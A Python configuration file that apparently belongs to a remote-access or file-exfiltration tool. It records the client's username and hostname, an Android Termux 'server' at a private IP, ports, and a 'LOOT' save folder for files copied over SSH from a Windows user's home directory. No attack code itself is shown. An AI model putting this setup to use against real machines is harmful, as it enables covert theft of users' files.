import getpass
import socket
client_username = getpass.getuser()
client_hostname = socket.gethostname()

# Server side settings
server_ip = '192.168.100.50'  # weasel ip (server)
# android termux # android termux ssh access guide (https://joeprevite.com/ssh-termux-from-computer/)
server_hostname = '192.168.100.50'
server_username = 'u0_a764'  # weasel

# server_savecopy_path = '/home/weasel/Desktop/LOOT/'  # for kali linux
server_savecopy_path = '/data/data/com.termux/files/home/'  # for android Termux


# server_port = 443  # for connection (best choice)
# for connection (android Termux does not allow for 443. So just use this. maybe might fail?)
server_port = 4000

# for copy files. need to always turn on ssh in kali. "sudo service ssh start"
server_ssh_port = 8022  # for Termux default
# server_ssh_port = 22 # for pi or kali

# Client side settings
client_savecopy_path = (
    "C:\\Users\\{}").format(client_username)
